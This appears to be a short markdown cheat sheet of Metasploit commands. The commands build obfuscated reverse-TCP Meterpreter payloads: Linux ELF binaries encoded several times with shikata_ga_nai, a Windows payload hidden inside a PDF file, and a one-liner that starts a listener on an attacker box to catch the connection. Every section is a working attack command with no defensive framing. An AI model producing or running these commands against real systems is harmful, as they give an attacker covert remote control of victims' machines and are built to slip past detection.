# metasploit framework
## basic encoded linux reverse meterpreter
### proving the ecoder is working correctly

	touch tmp && for i in {1..3}; do msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -e x86/shikata_ga_nai -i 5 LHOST=0.0.0.0 LPORT=5253 -o mal.elf && sha256sum mal.elf >> tmp; rm mal.elf; done;

### payload generation and starting handler, one liner
	
	sudo service postgresql restart && msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -e x86/shikata_ga_nai -i 5 LHOST=attackBox LPORT=attackPort -o mal.elf && msfconsole -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST attackBox; set LPORT attackPort; exploit"

## embedded pdf executable

	msfvenom -p windows/meterpreter/reverse_tcp -f psh -x download.pdf -k LHOST=0.0.0.0 LPORT=5253 -o mal.pdf
